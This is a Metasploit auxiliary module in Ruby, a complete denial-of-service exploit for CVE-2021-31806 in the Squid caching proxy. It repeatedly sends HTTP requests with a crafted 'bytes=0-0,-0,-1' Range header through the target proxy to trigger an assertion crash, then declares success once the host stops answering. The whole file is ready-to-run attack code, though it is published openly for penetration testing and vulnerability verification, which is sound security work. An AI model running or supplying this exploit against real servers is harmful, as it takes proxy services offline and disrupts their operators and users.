##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Squid Proxy Range Header DoS',
        'Description' => %q{
          The range handler in The Squid Caching Proxy Server 3.0-4.1.4 and
          5.0.1-5.0.5 incorrectly handles impossible-to-satisfy range requests, and
          allows remote attackers to cause a denial of service (assertion) through
          a single HTTP request via a specific Range header.
        },
        'Author' => [
          'Joshua Rogers' # Discoverer, and Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          ['DOS', { 'Description' => 'Perform Denial of Service Against The Target' }]
        ],
        'DefaultAction' => 'DOS',
        'References' => [
          [ 'CVE', '2021-31806'],
          [ 'URL', 'https://blogs.opera.com/security/2021/10/fuzzing-http-proxies-squid-part-2/']
        ],
        'DisclosureDate' => '2021-05-27',
        'Notes' => {
          'Stability' => [ CRASH_SERVICE_DOWN ],
          'Reliability' => [ ],
          'SideEffects' => [ IOC_IN_LOGS ]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(3128),
        OptInt.new('REQUEST_COUNT', [ true, 'The number of requests to be sent, as well as the number of re-tries to confirm a dead host', 50 ]),
      ]
    )
  end

  def on_request_uri(cli, _request)
    # the Cache-Control header must be set to avoid needing a specific configuration setting and the body must not be
    # empty
    send_response(cli, '<html></html>', { 'Cache-Control' => 'private' })
  end

  def run
    count = 0
    error_count = 0 # The amount of connection errors from the server.
    reqs = datastore['REQUEST_COUNT'] # The maximum amount of requests (with a valid response) to the server.

    print_status("Sending #{reqs} DoS requests to #{peer}")

    start_service

    while reqs > count
      begin
        res = send_request_raw({
          'uri' => get_uri,
          'headers' => {
            'Host' => "#{srvhost_addr}:#{srvport}",
            'Range' => 'bytes=0-0,-0,-1',
            'Proxy-Connection' => 'Keep-Alive'
          }
        })
      rescue Errno::ECONNRESET
        res = nil
      end

      if res
        count += 1
        print_status("Sent DoS request #{count} to #{rhost}:#{rport}")
        error_count = 0

        if res.code != 206
          print_error('Unexpected Response. Host may not be valid.')
        end

        next # Host could be completely dead, or just waiting for another Squid child.
      end

      if count == 0
        print_error('Cannot connect to host.')
        return
      end

      error_count += 1
      if error_count > reqs # If we cannot connect after `res` amount of attempts, assume the DoS was successful.
        print_good('DoS completely successful.')
        return
      end
    end
  end
end
